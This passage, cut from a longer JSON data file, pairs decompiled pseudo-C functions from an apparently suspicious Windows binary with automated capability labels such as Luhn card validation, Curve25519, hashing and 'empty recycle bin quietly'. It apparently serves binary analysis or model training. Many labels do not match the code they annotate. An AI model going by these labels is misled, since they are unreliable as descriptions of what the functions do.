<< (*0x414bd8 - 0x3fU & 0x1f);\n        if ((*0x414be0 & 0x5cU) == *0x4141e4 >> 0x13) goto code_r0x00406bc3;\n    }\n    fcn.00406510(*0x4148e4 & 0xffff, *0x414bd0);\ncode_r0x00406bc3:\n    *(unaff_EDI + 0x101) = uVar6;\n    *0x4141e4 = *0x4141e4 & *0x414bc8 - 0xb7;\n    return;\n}\n",
        "token_count": 1461
    },
    "0040839a": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040839a(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    \n    if (param_2 != 0) {\n        puVar2 = param_1 + 1;\n        puVar1 = param_3 + 2;\n        iVar3 = (param_2 - 1U >> 2) + 1;\n        do {\n            puVar2[-1] = puVar1[-2];\n            *puVar2 = puVar1[-1];\n            puVar2[1] = *puVar1;\n            puVar2[2] = puVar1[1];\n            puVar1 = puVar1 + 4;\n            puVar2 = puVar2 + 4;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "0040a32a": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint fcn.0040a32a(uint param_1, int32_t param_2)\n\n{\n    uint *in_EAX;\n    uint32_t n;\n    ulong uVar1;\n    \n    n = param_2 + 3U >> 2;\n    fcn.0040a29a(n);\n    fcn.0040d366(*in_EAX, n, param_1);\n    uVar1 = fcn.0040cf67(*in_EAX);\n    in_EAX[1] = uVar1;\n    return uVar1 >> 0x20;\n}\n",
        "token_count": 128
    },
    "0040be29": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040bede)\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040be29(uint32_t param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint32_t *extraout_ECX_02;\n    uint32_t *puVar7;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint32_t uVar8;\n    uint32_t unaff_EDI;\n    uint32_t uVar9;\n    int64_t iVar10;\n    uint32_t in_stack_ffffffc0;\n    uint32_t *puStack28;\n    uint32_t *puStack12;\n    \n    uVar1 = *0x414007;\n    uVar8 = *0x414007;\n    if (*0x414008 <= (uVar8 & 4)) {\n        *0x414008 = 0;\n    }\n    fcn.0040bde1(*0x414120);\n    if ((*0x414008 == uVar8) && (*0x414008 < 0x3795e3)) {\n        puStack12 = uVar8 >> 0x1f;\n        if ((uVar8 < 0) || (*0x414008 < (uVar8 ^ 0xb0))) {\n            iVar4 = fcn.0040bdb9(uVar1);\n            in_stack_ffffffc0 = uVar8;\n            iVar10 = sub.ntdll.dll__allmul(uVar8, puStack12, 0xb3, 0);\n            if (iVar10 < CONCAT44(iVar4 >> 0x1f, unaff_EBP)) {\n                iVar4 = fcn.0040bde1(*0x414038);\n                iVar5 = fcn.0040bde1(*0x414138);\n                if (((((iVar4 <= iVar5) && (unaff_EDI <= (*0x414008 ^ 5))) && (*0x414008 < 0x3795e3)) &&\n                    ((iVar4 = fcn.0040bdb9(0x6e),  iVar4 == *0x414008 * 0x80 && (-1 < extraout_ECX)))) &&\n                   (((0 < extraout_ECX || (uVar8 != 0)) && (uVar6 = fcn.0040bdb9(uVar1),  (*0x414008 & 0x5b) < uVar6))))\n                {\n                    uVar6 = fcn.0040bdb9(uVar1);\n                    if (((-1 < extraout_ECX_00) && ((0 < extraout_ECX_00 || ((uVar6 & 0x5b) <= uVar8)))) &&\n                       ((uVar8 == 0xf5 && ((extraout_ECX_00 == uVar8 < 0xf5 && (uVar1 == 0)))))) {\n                        fcn.0040bdb9(0x51);\n                    }\n                }\n            }\n        }\n    }\n    uVar3 = *0x414120;\n    *0x414008 = 0;\n    uVar8 = param_1 >> 0x10;\n    uVar9 = (param_2 >> 0x10) * (param_1 & 0xffff);\n    *puStack12 = (param_1 & 0xffff) * (param_2 & 0xffff);\n    uVar6 = uVar8 * (param_2 & 0xffff) + uVar9;\n    iVar4 = fcn.0040bde1(uVar3);\n    *0x414008 = iVar4 * *0x414008;\n    if (uVar9 <= uVar6) {\n        fcn.0040bdb9(uVar1);\n        fcn.0040bde1(0);\n    }\n    else {\n        *0x414008 = 0x3795e3;\n    }\n    if (uVar1 == 0x13) {\n        if ((*0x414008 < 0x3795e4) &&\n           (*0x414008 = puStack12 & 7,  *0x414018 = *0x414008,  (*0x414008 | 0x16) < 0x1bcaf19)) {\n            *0x414018 = (*0x414008 + 0x5a) * 6;\n        }\n    }\n    else {\n        iVar4 = fcn.0040bde1(1);\n        if (((unaff_EDI ^ 1) < iVar4) || (0x3795e2 < (*0x414008 ^ 0x58))) {\n            *0x414008 = *0x414008 * unaff_EDI;\n        }\n    }\n    *0x414008 = *0x414008 | 0x3795d0;\n    iVar5 = (uVar9 > uVar6) * 0x10000 + (uVar6 >> 0x10);\n    uVar9 = unaff_EDI;\n    iVar4 = fcn.0040bdb9(uVar1);\n    if (((-1 < iVar4 - 0xfU) && (iVar4 - 0xfU < (unaff_EDI & 0x91))) && (0x3795e2 < *0x414008 - 0x6e)) {\n        if (puStack12 * 0xd5 < uVar9) {\n            *0x414008 = puStack12;\n        }\n        else {\n            fcn.0040bde1(*0x414124);\n        }\n    }\n    uVar2 = *0x414008;\n    *puStack12 = *puStack12 + uVar6 * 0x10000;\n    if ((((uVar2 & 0x90) != 0x379639) || (uVar2 != 2)) || ((uVar1 & 0x72) == 0)) {\n        *0x414008 = 0;\n    }\n    puVar7 = puStack12;\n    if (uVar6 * 0x10000 <= *puStack12) goto code_r0x0040c243;\n    iVar10 = sub.ntdll.dll__allmul(unaff_EDI, unaff_EDI >> 0x1f, 0x2d, 0);\n    if (iVar10 == CONCAT44(unaff_EBX, unaff_EDI - 0xff)) {\ncode_r0x0040c1be:\n        uVar6 = fcn.0040bde1(1);\n        if (((((in_stack_ffffffc0 != uVar6) || (*0x414008 < in_stack_ffffffc0)) || ((*0x414008 ^ 0x46) < 0x3795e4)) &&\n            ((puStack28 != (*0x414008 ^ 0x35) || (uVar6 = fcn.0040bde1(*0x414140),  uVar6 != *0x414008)))) &&\n           ((*0x414008 < 0x379558 || (*0x414008 < 0x3795e3)))) {\n            fcn.0040bde1(*0x4141c4);\n        }\n    }\n    else {\n        fcn.0040bde1(*0x414108);\n        iVar4 = fcn.0040bdb9(uVar1);\n        if (iVar4 + -0xbe < extraout_ECX_01) goto code_r0x0040c1be;\n    }\n    *0x414008 = 0;\n    puVar7 = puStack28;\ncode_r0x0040c243:\n    if (uVar1 == 0) {\n        fcn.0040bdb9(0x55);\n        puVar7 = extraout_ECX_02;\n    }\n    uVar3 = *0x414150;\n    puVar7[1] = uVar8 * (param_2 >> 0x10);\n    iVar4 = fcn.0040bde1(uVar3);\n    *0x414008 = *0x414008 - iVar4;\n    puStack12[1] = puStack12[1] + iVar5;\n    if ((((-1 < unaff_EDI) && (unaff_EDI <= *0x414008 >> 0x14)) || ((uVar9 | 0x54) <= *0x414008)) ||\n       (((unaff_EDI >> 0x1f) + (0xffffff9f < unaff_EDI) != 0 || (*0x414008 < unaff_EDI + 0x60)))) {\n        uVar8 = fcn.0040bdb9(0x72);\n        uVar6 = (uVar8 ^ 0xf5) >> 0x1f;\n        uVar9 = (uVar1 | 0x66) >> 0x1f;\n        if ((uVar9 <= uVar6) && ((uVar9 < uVar6 || ((uVar1 | 0x66) <= (uVar8 ^ 0xf5))))) {\n            *0x414008 = *0x414008 * 0x18d6a29;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 2098
    },
    "00409775": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nbool fcn.00409775(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint lptstrFilename;\n    uint *unaff_ESI;\n    bool bVar4;\n    uint *s1;\n    uint var_34h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    \n    bVar4 = false;\n    cVar2 = fcn.00409e9f();\n    if (cVar2 != '\\0') {\n        *unaff_ESI = 0x11c;\n        pcVar1 = _sym.imp.KERNEL32.dll_GetVersionExW;\n        bVar4 = true;\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetVersionExW)();\n        if (iVar3 == 0) {\n            *unaff_ESI = 0x114;\n            iVar3 = (*pcVar1)();\n            bVar4 = iVar3 != 0;\n            if (!bVar4) {\n                return bVar4;\n            }\n        }\n        s1 = &var_34h;\n        lptstrFilename = fcn.00405e30(0x412738, 0xc, 0xf85e425a, 0);\n        fcn.004096ec(lptstrFilename, s1);\n        unaff_ESI[1] = var_2ch >> 0x10;\n        unaff_ESI[2] = var_2ch & 0xffff;\n        unaff_ESI[3] = var_28h >> 0x10;\n    }\n    return bVar4;\n}\n",
        "token_count": 354
    },
    "0040e675": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.0040e675(void)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t *unaff_ESI;\n    int32_t iVar4;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *unaff_ESI + 7;\n    iVar4 = (iVar4 >> 0x1f & 7U) + iVar4 >> 3;\n    uVar2 = *unaff_ESI & 0x80000007;\n    if (uVar2 < 0) {\n        uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n    }\n    if (0 < iVar4) {\n        puVar1 = unaff_ESI + 2;\n        var_ch = iVar4;\n        do {\n            *puVar1 = *((0x80 - iVar4) + puVar1);\n            puVar1 = puVar1 + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    if (iVar4 < 0x80) {\n        sub.ntdll.dll_memset(iVar4 + 8 + unaff_ESI, 0, 0x80 - iVar4);\n    }\n    if ((0 < uVar2) && (0 < iVar4)) {\n        puVar1 = unaff_ESI + 2;\n        do {\n            uVar3 = *puVar1 << (8 - uVar2 & 0x1f);\n            *puVar1 = uVar3;\n            if ((-7 - unaff_ESI) + puVar1 < 0x80) {\n                *puVar1 = (puVar1 + -unaff_ESI + 1)[unaff_ESI] >> (uVar2 & 0x1f) | uVar3;\n            }\n            puVar1 = puVar1 + 1;\n        } while (-unaff_ESI + -8 + puVar1 < iVar4);\n    }\n    return;\n}\n",
        "token_count": 473
    },
    "0040877e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.0040877e(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint lpSystemInfo;\n    uint var_20h;\n    \n    lpSystemInfo = 0;\n    puVar2 = &var_20h;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetNativeSystemInfo)(&lpSystemInfo);\n    return lpSystemInfo == 9;\n}\n",
        "token_count": 146
    },
    "0040a996": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.0040a996(uint8_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint8_t uVar7;\n    uint8_t *puVar8;\n    uint32_t var_4h;\n    \n    piVar3 = arg_ch;\n    uVar7 = *arg_8h;\n    *arg_ch = 0;\n    arg_ch[1] = 0;\n    arg_ch[2] = 0;\n    piVar1 = arg_ch + 4;\n    arg_ch[3] = 0;\n    arg_ch = arg_8h;\n    *piVar1 = 0;\n    if (uVar7 == 0x2a) {\n        piVar3[1] = piVar3[1] | 0x40;\n        arg_ch = arg_8h + 1;\n    }\n    iVar4 = fcn.0040b915();\n    piVar3[2] = iVar4;\n    if (iVar4 == 0) {\n        piVar3[2] = -1;\n    }\n    uVar7 = *arg_ch;\n    if (uVar7 == 0x6c) {\n        if (*(arg_ch + 1) == 0x6c) {\n            piVar3[1] = piVar3[1] | 0x10;\n            arg_ch = arg_ch + 2;\n        }\n        else {\n            piVar3[1] = piVar3[1] | 1;\n            arg_ch = arg_ch + 1;\n        }\n        goto code_r0x0040aa4f;\n    }\n    if (uVar7 == 0x68) {\n        piVar3[1] = piVar3[1] | 2;\n    }\n    else if (uVar7 == 0x77) {\n        piVar3[1] = piVar3[1] | 4;\n    }\n    else {\n        if (uVar7 != 0x4c) {\n            if (uVar7 == 0x49) {\n                if ((*(arg_ch + 1) == 0x36) && (*(arg_ch + 2) == 0x34)) {\n                    uVar5 = piVar3[1] & 0xfffffff7U | 0x10;\n                }\n                else {\n                    if ((*(arg_ch + 1) != 0x33) || (*(arg_ch + 2) != 0x32)) {\n                        piVar3[1] = piVar3[1] & 0xffffffe7U | 0x20;\n                        arg_ch = arg_ch + 1;\n                        goto code_r0x0040aa4f;\n                    }\n                    uVar5 = piVar3[1] & 0xffffffefU | 8;\n                }\n                piVar3[1] = uVar5;\n                arg_ch = arg_ch + 3;\n            }\n            goto code_r0x0040aa4f;\n        }\n        piVar3[1] = piVar3[1] | 0x10;\n    }\n    arg_ch = arg_ch + 1;\ncode_r0x0040aa4f:\n    iVar4 = fcn.0040a862();\n    if (iVar4 == 0) {\n        arg_ch = arg_8h + -1;\n    }\n    else if (*piVar3 == 9) {\n        iVar4 = fcn.00406338(8);\n        puVar8 = arg_ch + 1;\n        uVar7 = *puVar8;\n        piVar3[4] = iVar4;\n        if (uVar7 == 0x5e) {\n            puVar8 = arg_ch + 2;\n            *(piVar3 + 3) = 1;\n        }\n        arg_ch = puVar8;\n        arg_ch._3_1_ = 0;\n        if (*puVar8 == 0x5d) {\n            *(iVar4 + 0xb) = *(iVar4 + 0xb) | 0x20;\n            arg_ch = puVar8 + 1;\n            arg_ch._3_1_ = 0x5d;\n        }\n        while ((uVar7 = *arg_ch,  uVar7 != 0 && (uVar7 != 0x5d))) {\n            if ((uVar7 == 0x2d) && ((arg_ch._3_1_ != 0 && (uVar2 = *(arg_ch + 1),  uVar2 != 0x5d)))) {\n                uVar7 = uVar2;\n                if (arg_ch._3_1_ < uVar2) {\n                    uVar7 = arg_ch._3_1_;\n                    arg_ch._3_1_ = uVar2;\n                }\n                if (uVar7 < arg_ch._3_1_) {\n                    var_4h = arg_ch._3_1_ - uVar7;\n                    iVar6 = uVar7;\n                    do {\n                        puVar8 = (iVar6 >> 3) + iVar4;\n                        *puVar8 = *puVar8 | '\\x01' << (iVar6 & 7);\n                        iVar6 = iVar6 + 1;\n                        var_4h = var_4h - 1;\n                    } while (var_4h != 0);\n                }\n                puVar8 = (arg_ch._3_1_ >> 3) + iVar4;\n                *puVar8 = *puVar8 | '\\x01' << (arg_ch._3_1_ & 7);\n                arg_ch = arg_ch + 2;\n                arg_ch._3_1_ = 0;\n            }\n            else {\n                puVar8 = (uVar7 >> 3) + iVar4;\n                *puVar8 = *puVar8 | '\\x01' << (uVar7 & 7);\n                arg_ch = arg_ch + 1;\n                arg_ch._3_1_ = uVar7;\n            }\n        }\n    }\n    return arg_ch + (1 - arg_8h);\n}\n",
        "token_count": 1380
    },
    "00408a11": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nuint fcn.00408a11(void)\n\n{\n    ulong uVar1;\n    uint uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    \n    uVar2 = *0x42e3b4;\n    if (in_EAX == 0) {\n        return 0;\n    }\n    if (*0x42e3c0 == 0x12345678) {\n        uVar1 = rdtsc();\n        *0x42e3c0 = uVar1;\n    }\n    *0x42e3c0 = *0x42e3c0 << 0xb ^ *0x42e3c0;\n    uVar3 = (*0x42e3bc >> 0xb ^ *0x42e3c0) >> 8 ^ *0x42e3bc ^ *0x42e3c0;\n    *0x42e3b4 = *0x42e3b8;\n    *0x42e3b8 = *0x42e3bc;\n    *0x42e3bc = uVar3;\n    *0x42e3c0 = uVar2;\n    return (uVar3 % (in_EAX * 100)) / 100;\n}\n",
        "token_count": 280
    },
    "0040b33c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nint32_t fcn.0040b33c(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    uint16_t **unaff_ESI;\n    \n    puVar3 = *unaff_ESI;\n    iVar2 = 0;\n    while( true ) {\n        uVar1 = *puVar3;\n        if ((uVar1 < 0x30) || (0x39 < uVar1)) break;\n        iVar2 = iVar2 * 10 + -0x30 + uVar1;\n        puVar3 = puVar3 + 1;\n    }\n    *unaff_ESI = puVar3;\n    return iVar2;\n}\n",
        "token_count": 158
    },
    "0040b915": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nint32_t fcn.0040b915(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char **unaff_ESI;\n    \n    iVar2 = 0;\n    for (pcVar3 = *unaff_ESI; (cVar1 = *pcVar3,  '/' < cVar1 && (cVar1 < ':')); pcVar3 = pcVar3 + 1) {\n        iVar2 = iVar2 * 10 + -0x30 + cVar1;\n    }\n    *unaff_ESI = pcVar3;\n    return iVar2;\n}\n",
        "token_count": 137
    },
    "0040a58d": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint fcn.0040a58d(uint32_t param_1)\n\n{\n    int32_t n;\n    uint *in_EAX;\n    uint uVar1;\n    \n    if (in_EAX[1] <= param_1 >> 5) {\n        n = (param_1 >> 5) + 1;\n        fcn.0040a29a(n);\n        in_EAX[1] = n;\n    }\n    fcn.0040d181(*in_EAX, in_EAX[1]);\n    uVar1 = fcn.0040cf67(*in_EAX);\n    in_EAX[1] = uVar1;\n    return 0;\n}\n",
        "token_count": 148
    },
    "0040b455": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040b455(int16_t *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    int16_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    \n    puVar3 = arg_ch;\n    iVar2 = *arg_8h;\n    *arg_ch = 0;\n    arg_ch[1] = 0;\n    puVar1 = arg_ch + 3;\n    arg_ch[2] = 0;\n    arg_ch = arg_8h;\n    *puVar1 = 0;\n    if (iVar2 == 0x2d) {\n        puVar3[1] = puVar3[1] | 1;\n        arg_ch = arg_8h + 1;\n    }\n    if (*arg_ch == 0x2b) {\n        arg_ch = arg_ch + 2;\n        puVar3[1] = puVar3[1] & 0xfffffbff | 0x200;\n    }\n    if (*arg_ch == 0x20) {\n        if ((puVar3[1] & 0x200) == 0) {\n            puVar3[1] = puVar3[1] | 0x400;\n        }\n        arg_ch = arg_ch + 2;\n    }\n    if (*arg_ch == 0x23) {\n        puVar3[1] = puVar3[1] | 2;\n        arg_ch = arg_ch + 2;\n    }\n    if (*arg_ch == 0x30) {\n        puVar3[1] = puVar3[1] | 0x1004;\n        arg_ch = arg_ch + 2;\n    }\n    iVar4 = fcn.0040b33c();\n    puVar3[2] = iVar4;\n    if ((iVar4 != 0) && ((puVar3[1] & 2) != 0)) {\n        puVar3[1] = puVar3[1] | 0x1000;\n    }\n    if (*arg_ch == 0x2e) {\n        arg_ch = arg_ch + 2;\n        uVar5 = fcn.0040b33c();\n        puVar3[3] = uVar5;\n    }\n    iVar2 = *arg_ch;\n    if (iVar2 == 0x6c) {\n        if (*(arg_ch + 2) == 0x6c) {\n            puVar3[1] = puVar3[1] | 0x100;\n            arg_ch = arg_ch + 4;\n        }\n        else {\n            puVar3[1] = puVar3[1] | 8;\n            arg_ch = arg_ch + 2;\n        }\n        goto code_r0x0040b5a2;\n    }\n    if (iVar2 == 0x68) {\n        puVar3[1] = puVar3[1] | 0x10;\n    }\n    else {\n        if (iVar2 != 0x77) {\n            if (iVar2 == 0x49) {\n                if ((*(arg_ch + 2) == 0x36) && (*(arg_ch + 4) == 0x34)) {\n                    uVar6 = puVar3[1] & 0xffffff7f | 0x100;\n                }\n                else {\n                    if ((*(arg_ch + 2) != 0x33) || (*(arg_ch + 4) != 0x32)) {\n                        puVar3[1] = puVar3[1] & 0xfffffe7f | 0x800;\n                        arg_ch = arg_ch + 2;\n                        goto code_r0x0040b5a2;\n                    }\n                    uVar6 = puVar3[1] & 0xfffffeff | 0x80;\n                }\n                puVar3[1] = uVar6;\n                arg_ch = arg_ch + 6;\n            }\n            goto code_r0x0040b5a2;\n        }\n        puVar3[1] = puVar3[1] | 0x40;\n    }\n    arg_ch = arg_ch + 2;\ncode_r0x0040b5a2:\n    iVar4 = fcn.0040b360(0);\n    if (iVar4 == 0) {\n        arg_ch = arg_8h + -1;\n    }\n    return (arg_ch - arg_8h >> 1) + 1;\n}\n",
        "token_count": 1004
    },
    "0040b935": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.0040b935(char *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    char cVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    \n    puVar3 = arg_ch;\n    cVar2 = *arg_8h;\n    *arg_ch = 0;\n    arg_ch[1] = 0;\n    puVar1 = arg_ch + 3;\n    arg_ch[2] = 0;\n    arg_ch = arg_8h;\n    *puVar1 = 0;\n    if (cVar2 == '-') {\n        puVar3[1] = puVar3[1] | 1;\n        arg_ch = arg_8h + 1;\n    }\n    if (*arg_ch == '+') {\n        arg_ch = arg_ch + 1;\n        puVar3[1] = puVar3[1] & 0xfffffbff | 0x200;\n    }\n    if (*arg_ch == ' ') {\n        if ((puVar3[1] & 0x200) == 0) {\n            puVar3[1] = puVar3[1] | 0x400;\n        }\n        arg_ch = arg_ch + 1;\n    }\n    if (*arg_ch == '#') {\n        puVar3[1] = puVar3[1] | 2;\n        arg_ch = arg_ch + 1;\n    }\n    if (*arg_ch == '0') {\n        puVar3[1] = puVar3[1] | 0x1004;\n        arg_ch = arg_ch + 1;\n    }\n    iVar4 = fcn.0040b915();\n    puVar3[2] = iVar4;\n    if ((iVar4 != 0) && ((puVar3[1] & 2) != 0)) {\n        puVar3[1] = puVar3[1] | 0x1000;\n    }\n    if (*arg_ch == '.') {\n        arg_ch = arg_ch + 1;\n        uVar5 = fcn.0040b915();\n        puVar3[3] = uVar5;\n    }\n    cVar2 = *arg_ch;\n    if (cVar2 == 'l') {\n        if (*(arg_ch + 1) == 'l') {\n            puVar3[1] = puVar3[1] | 0x100;\n            arg_ch = arg_ch + 2;\n        }\n        else {\n            puVar3[1] = puVar3[1] | 8;\n            arg_ch = arg_ch + 1;\n        }\n        goto code_r0x0040ba65;\n    }\n    if (cVar2 == 'h') {\n        puVar3[1] = puVar3[1] | 0x10;\n    }\n    else {\n        if (cVar2 != 'w') {\n            if (cVar2 == 'I') {\n                if ((*(arg_ch + 1) == '6') && (*(arg_ch + 2) == '4')) {\n                    uVar6 = puVar3[1] & 0xffffff7f | 0x100;\n                }\n                else {\n                    if ((*(arg_ch + 1) != '3') || (*(arg_ch + 2) != '2')) {\n                        puVar3[1] = puVar3[1] & 0xfffffe7f | 0x800;\n                        arg_ch = arg_ch + 1;\n                        goto code_r0x0040ba65;\n                    }\n                    uVar6 = puVar3[1] & 0xfffffeff | 0x80;\n                }\n                puVar3[1] = uVar6;\n                arg_ch = arg_ch + 3;\n            }\n            goto code_r0x0040ba65;\n        }\n        puVar3[1] = puVar3[1] | 0x40;\n    }\n    arg_ch = arg_ch + 1;\ncode_r0x0040ba65:\n    iVar4 = fcn.0040b360(1);\n    if (iVar4 == 0) {\n        arg_ch = arg_8h + -1;\n    }\n    return arg_ch + (1 - arg_8h);\n}\n",
        "token_count": 950
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00401000(void)\n\n{\n    uint arg_8h;\n    int32_t arg_8h_00;\n    uint uVar1;\n    uchar auStack4 [4];\n    \n    // [00] -r-x section size 65536 named .text\n    uVar1 = 0;\n    arg_8h = fcn.00405e30(0x412008, 6, 0xb043cb8b, 0);\n    arg_8h_00 = fcn.00406dc9(arg_8h, 0x414c24, *0x414c20);\n    if (arg_8h_00 != 0) {\n        uVar1 = fcn.0040f651(arg_8h_00, auStack4);\n        fcn.00406445();\n    }\n    return uVar1;\n}\n",
        "token_count": 190
    },
    "00401051": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00401051(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    \n    uVar4 = 0;\n    uVar1 = fcn.00405e30(0x412010, 0xd, 0x849ae85f, 0);\n    iVar2 = fcn.0040f475(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.00405e30(0x412010, 0xd, 0x849ae85f, 0);\n        fcn.0040f475(uVar1);\n        iVar5 = fcn.0040f531();\n        if (iVar5 != 0) {\n            uVar1 = fcn.00405e30(0x412020, 7, 0x844ae6f0, 0);\n            iVar2 = fcn.0040f475(uVar1);\n            if (iVar2 != 0) {\n                uVar3 = fcn.0040f418();\n                if (uVar3 != 0) {\n                    do {\n                        iVar2 = fcn.0040f43f(uVar4);\n                        if (iVar2 != 0) {\n                            *0x42e40c = fcn.004063a5();\n                            iVar2 = fcn.0040f598();\n                            if (iVar2 != 0) {\n                                uVar1 = fcn.00408e9a(iVar2);\n                                iVar2 = *0x42e424;\n                                *0x42e424 = *0x42e424 + 1;\n                                *(*0x42e40c + iVar2 * 4) = uVar1;\n                            }\n                        }\n                        uVar4 = uVar4 + 1;\n                    } while (uVar4 < uVar3);\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 437
    },
    "004017a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004017a0(uint arg_8h)\n\n{\n    int16_t *piVar1;\n    int16_t *piVar2;\n    int16_t iVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint uVar7;\n    uint extraout_ECX;\n    uint uStack1684;\n    uchar auStack1668 [16];\n    uchar auStack1652 [76];\n    uchar auStack1576 [460];\n    uchar auStack1116 [1112];\n    \n    uStack1684 = 0;\n    iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n    while ((iVar5 != 0 && (puVar6 = fcn.00401772(),  puVar6 != NULL))) {\n        iVar5 = puVar6[2];\n        piVar2 = iVar5 + puVar6[3] * 2;\n        piVar1 = piVar2 + -1;\n        iVar3 = *piVar1;\n        while (iVar3 != 0x5c) {\n            iVar3 = piVar1[-1];\n            piVar2 = piVar1;\n            piVar1 = piVar1 + -1;\n        }\n        (*_sym.imp.SHLWAPI.dll_StrCpyNW)();\n        cVar4 = fcn.00403ed8();\n        if (cVar4 != '\\0') {\n            uStack1684 = *puVar6;\n            (*_sym.imp.KERNEL32.dll_FileTimeToLocalFileTime)();\n            (*_sym.imp.KERNEL32.dll_FileTimeToSystemTime)();\n            (*_sym.imp.KERNEL32.dll_GetDateFormatW)(0x400, 1, &uStack1684, 0, auStack1668, 0x14);\n            (*_sym.imp.KERNEL32.dll_GetTimeFormatW)(0x400, 8, &stack0xfffff954, 0, auStack1652, 0x14);\n            uVar7 = fcn.00406209(0x412034, 0x28, 0xc82f60c7, extraout_ECX, iVar5, &stack0xfffff94c, &stack0xfffff974);\n            (*_sym.imp.USER32.dll_wsprintfW)(auStack1116, uVar7);\n            (*_sym.imp.KERNEL32.dll_OutputDebugStringW)(auStack1116);\n        }\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        cVar4 = fcn.004011f1(iVar5, auStack1576, piVar2 - iVar5 >> 1);\n        if (cVar4 != '\\0') {\n            fcn.00404da7();\n            *0x42e3f4 = *0x42e3f4 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n        iVar5 = 